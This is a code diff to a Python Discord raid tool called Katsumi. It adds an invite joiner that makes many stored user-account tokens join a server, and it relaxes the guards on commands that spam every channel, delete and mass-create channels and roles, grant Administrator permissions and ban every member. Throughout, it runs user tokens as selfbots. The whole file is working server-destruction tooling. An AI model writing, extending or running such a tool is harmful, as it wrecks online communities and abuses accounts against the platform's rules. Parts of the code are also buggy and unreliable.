@@ -9,6 +9,12 @@ envList = False
 
 # ↑↑↑↑↑ IF YOU'RE RUNNING IN REPLIT AND HAVE YOUR .env LIKE THIS TOKENS=["token"] OR JUST HAVE YOUR TOKEN LIST IN .env SET THIS TO True ↑↑↑↑↑
 
+
+# ADD .ENV FUNCTIONALITY FOR NEW TOKEN SYSTEM!!!!
+#added? not debugged
+
+
+
 f = pyfiglet.Figlet(font="shadow")
 asciiArt = f.renderText
 SRESET = Style.RESET_ALL
@@ -36,6 +42,9 @@ with open("icon.jpg", "rb") as f:
 #	  return f.readlines()
 
 def getTokens():
+	if envList == True:
+		tkns = os.getenv("TOKENS")
+		return json.loads(tkns)
 	with open("tokens.json", "r") as f:
 		tkns = json.load(f)
 	return tkns
@@ -43,6 +52,9 @@ def getTokens():
 def setTokens(jsonTkns):
 	global tokens
 	tokens = jsonTkns
+	if envList == True:
+		os.environ["TOKENS"] = json.dumps(jsonTkns)
+		return
 	with open("tokens.json", "w") as f:
 		json.dump(jsonTkns, f)
 
@@ -127,7 +139,9 @@ async def mainMenu():
 			await mainMenu()
 	except:
 		await mainMenu()
-		
+
+
+
 async def firstRunMenu():
 	cls()
 	print(Fore.GREEN + "\n\n\n" + asciiArt("Katsumi"))
@@ -151,6 +165,18 @@ async def redirector(typeOfRun):
 	else:
 		return await firstRunMenu()
 
+async def joinerMenu():
+	userAccounts = []
+	inviteCode = str(await async_input("code"))
+	for token, type in tokens.items():
+		if type["type"] == "User":
+			userAccounts.append(token)
+	for user in userAccounts:
+		header = {"Authorization": user}
+		r = requests.post(base_url + "invites/" + inviteCode, headers=header)
+		print(r.json())
+	await mainMenu()
+
 def pprintTokenInfo():
   tokens = getTokens()
   tkns = []
@@ -167,16 +193,43 @@ async def addTokenMenu():
   print(Fore.GREEN + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Current Tokens\n" + Style.NORMAL + "\n".join(pprintTokenInfo()) + SRESET)
   print(Fore.GREEN + Style.BRIGHT + "\n[1] " + Style.NORMAL + "Add a Token | " + Style.DIM + "[need to have internet connection for type checking]\n" + SRESET)
   print(Fore.GREEN + Style.BRIGHT + "\n[2] " + Style.NORMAL + "Back to Main Menu | " + Style.DIM + "[return to main menu]\n" + SRESET)
+  print(Fore.GREEN + Style.BRIGHT + "\n[3] " + Style.NORMAL + "Remove a Token | " + Style.DIM + "[removes a token from your token dict]\n" + SRESET)
   try:
   	inputInteger = int(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Choose | " + Style.DIM + "[every function has a number before it, choose them from the number]\n" + SRESET))
   	if inputInteger == 1:
   		loop.create_task(addToken())
   	elif inputInteger == 2:
   		loop.create_task(mainMenu())
+  	elif inputInteger == 3:
+  	  loop.create_task(removeToken())
   	else:
   		await addTokenMenu()
   except:
   	await addTokenMenu()
+
+async def removeToken():
+  print(Fore.GREEN + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Current Tokens\n" + Style.NORMAL + "\n".join(pprintTokenInfo()) + SRESET)
+  print("\n")
+  tokenRemoval = True
+  while tokenRemoval == True:
+    try:
+      inputToken = str(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Type the Token that you want to remove | " + Style.DIM + "Just copy&paste your token so that you don't make any mistake.\n" + SRESET))
+      tokensS = getTokens()
+      tokensS.pop(inputToken)
+      setTokens(tokensS)
+      print(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Removed successfully\n" + SRESET)
+    except KeyError:
+      print(Fore.RED + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Couldn't remove a nonexistent token\n" + SRESET)
+    except:
+      pass
+    inputInteger = int(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[?] " + Style.NORMAL + "Wanna remove more tokens? | " + Style.DIM + "Type 1 if yes and 2 if no.\n" + SRESET))
+    if inputInteger == 1:
+      tokenRemoval = True
+    else:
+      tokenRemoval = False
+  await mainMenu()
+    
+  
 
 async def addToken():
 	tokenAdding = True
@@ -284,13 +337,17 @@ def getClientsID():
 
 async def loginToken(asyncloop, controllerID, token, tokenType):
 	global clients
-	intents = discord.Intents().all()
-	client = commands.Bot(command_prefix="!", fetch_offline_members=False, intents=intents)
-	client.add_cog(Nuker(client, controllerID))
+	botloop = asyncio.get_event_loop()
 	if tokenType == "Bot":
-		asyncloop.create_task(client.start(token, bot=True))
+	  intents = discord.Intents().all()
+	  client = commands.Bot(command_prefix="!", fetch_offline_members=False, intents=intents)
+	  client.add_cog(Nuker(client, controllerID))
+	  botloop.create_task(client.start(token, bot=True))
 	elif tokenType == "User":
-		asyncloop.create_task(client.start(token, bot=False))
+	  client = commands.Bot(command_prefix="!", fetch_offline_members=False)
+	  client.add_cog(Nuker(client, controllerID))
+	  botloop.create_task(client.start(token, bot=False))
+	botloop.run_forever
 	clients.append(client)
 	return
 
@@ -316,16 +373,16 @@ class Nuker(commands.Cog):
 		await ctx.send("test indeed")
 	
 	@commands.command(aliases=["gperms", "giveperms"])
-	async def gp(self, ctx, *, roleName = None):
-	  if roleName == None:
-	    roleName = getRoleName()
+	async def gp(self, ctx, nl: bool = False):
+	  roleName = getRoleName()
 	  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Perms Transfer is starting! | " + Style.DIM + f"Going to try to give Administrator perms to your {len(clients)} nuker accounts\n" + SRESET)
 	  if ctx.author.id != self.controllerID:
 	    return
 	  global count5
-	  if count5 != 0:
-	    safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Perms Transfer already going on! | " + Style.DIM + f"Wait until the Perms Transfer ends\n" + SRESET)
-	    return
+	  if nl is False:
+	  	if count5 != 0:
+	  		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Perms Transfer already going on! | " + Style.DIM + f"Wait until the Perms Transfer ends\n" + SRESET)
+	  		return
 	  try:
 	    highestRolePos = ctx.guild.get_member(self.client.user.id).top_role.position
 	    if highestRolePos <= 0:
@@ -357,15 +414,16 @@ class Nuker(commands.Cog):
 	  
 	
 	@commands.command(aliases=["cspam", "channelspam"])
-	async def cs(self, ctx, msgCount: int = None):
+	async def cs(self, ctx, msgCount: int = None, nl: bool = False):
 		if msgCount == None:
 		  msgCount = 50
 		if ctx.author.id != self.controllerID:
 			return
 		global count0
-		if count0 != 0:
-			safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is already going on! | " + Style.DIM + f"Wait until the spam ends\n" + SRESET)
-			return
+		if nl is False:
+			if count0 != 0:
+				safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is already going on! | " + Style.DIM + f"Wait until the spam ends\n" + SRESET)
+				return
 		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is starting! | " + Style.DIM + f"Going to spam {msgCount} messages in #{ctx.channel.name}\n" + SRESET)
 		#count0 = 0
 		for i in range(msgCount):
@@ -379,15 +437,16 @@ class Nuker(commands.Cog):
 				break
 	
 	@commands.command(aliases=["cnuke","channelnuke"])
-	async def cn(self, ctx, channelCount: int= None):
+	async def cn(self, ctx, channelCount: int= None, nl: bool = False):
 		if channelCount == None:
 		  channelCount = 50
 		if ctx.author.id != self.controllerID:
 			return
 		global count1, count2
-		if count2 != 0 or count1 != 0:
-			safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Channel Nuke is already going on! | " + Style.DIM + f"Wait until the channel nuke ends\n" + SRESET)
-			return
+		if nl is False:
+			if count2 != 0 or count1 != 0:
+				safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Channel Nuke is already going on! | " + Style.DIM + f"Wait until the channel nuke ends\n" + SRESET)
+				return
 		for channel in ctx.guild.channels:
 			await channel.delete(reason=getMessage)
 			count2 += 1
@@ -397,7 +456,7 @@ class Nuker(commands.Cog):
 			count1 += 1
 			await txt.send(getMessage)
 			#await asyncio.sleep(0.3)
-			if count1 == channelCount:			
+			if count1 >= channelCount:			
 				await asyncio.sleep(3)
 				safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Channel Nuke is done! | " + Style.DIM + f"Deleted {count2} original channel(s) and created {count1} Katsumi channels\n" + SRESET)
 				count1 = 0
@@ -405,37 +464,39 @@ class Nuker(commands.Cog):
 				break
 	
 	@commands.command(aliases=["gspam", "globalspam"])
-	async def gs(self, ctx, msgCount: int= None):
+	async def gs(self, ctx, msgCount: int= None, nl: bool = False):
 		if msgCount == None:
 		  msgCount = 50
 		if ctx.author.id != self.controllerID:
 		  return
 		global count0
-		if count0 != 0:
-			safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Global Spam is already going on! | " + Style.DIM + f"Wait until the spam ends\n" + SRESET)
-			return
+		if nl is False:
+			if count0 != 0:
+				safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Global Spam is already going on! | " + Style.DIM + f"Wait until the spam ends\n" + SRESET)
+				return
 		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Global Spam is starting! | " + Style.DIM + f"Going to spam {msgCount} messages in every channel\n" + SRESET)
 		for i in range(msgCount):
 			for txtchannel in ctx.guild.text_channels:
 			  await txtchannel.send(getMessage)
 			  #await asyncio.sleep(0.5)
 			count0 += 1
-			if msgCount == count0:
+			if msgCount <= count0:
 			  await asyncio.sleep(3)
 			  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is done! | " + Style.DIM + f"Spammed {count0} messages in every channel\n" + SRESET)
 			  count0 = 0
 			  break
 	
 	@commands.command(aliases=["rnuke", "rolenuke"])
-	async def rn(self, ctx, roleCount: int= None):
+	async def rn(self, ctx, roleCount: int= None, nl: bool = False):
 	  if roleCount == None:
 	    roleCount = 50
 	  if ctx.author.id != self.controllerID:
 	    return
 	  global count3, count4
-	  if count3 != 0 or count4 != 0:
-	    safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Role Nuke is already going on! | " + Style.DIM + f"Wait until the role nuke ends\n" + SRESET)
-	    return
+	  if nl is False:
+	  	if count3 != 0 or count4 != 0:
+	  		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Role Nuke is already going on! | " + Style.DIM + f"Wait until the role nuke ends\n" + SRESET)
+	  		return
 	  for role in ctx.guild.roles:
 	    try:
 	      await role.delete(reason=getMessage)
@@ -447,7 +508,7 @@ class Nuker(commands.Cog):
 	    try:
 	      await ctx.guild.create_role(name=getRoleName(), color=getRandomColor())
 	      count3 += 1
-	      if count3 == roleCount:
+	      if count3 >= roleCount:
 	        await asyncio.sleep(3)
 	        safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Role Nuke is done! | " + Style.DIM + f"Deleted {count4} original role(s) and created {count3} Katsumi roles!\n" + SRESET)
 	        count3 = 0
@@ -460,13 +521,14 @@ class Nuker(commands.Cog):
 	    	return safePrint(Fore.RED + Style.BRIGHT + "\n[!] " + Style.NORMAL + f"Role Nuke has failed for {self.client.user.name}#{self.client.user.discriminator}! | " + Style.DIM + f"{self.client.user.name} doesn't have permissions to create roles!\n" + SRESET)
 
 	@commands.command(aliases=["bnuke", "bannuke"])
-	async def bn(self, ctx):
+	async def bn(self, ctx, nl: bool = False):
 	  if ctx.author.id != self.controllerID:
 	    return
 	  global count6
-	  if count6 != 0:
-	    safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Ban Nuke is already going on! | " + Style.DIM + f"Wait until the ban nuke ends\n" + SRESET)
-	    return
+	  if nl is False:
+	  	if count6 != 0:
+	  		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Ban Nuke is already going on! | " + Style.DIM + f"Wait until the ban nuke ends\n" + SRESET)
+	  		return
 	  userCount = 0
 	  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Ban Nuke is starting! | " + Style.DIM + f"Going to try to ban every member of {ctx.guild.name}!\n" + SRESET)
 	  for user in ctx.guild.members:
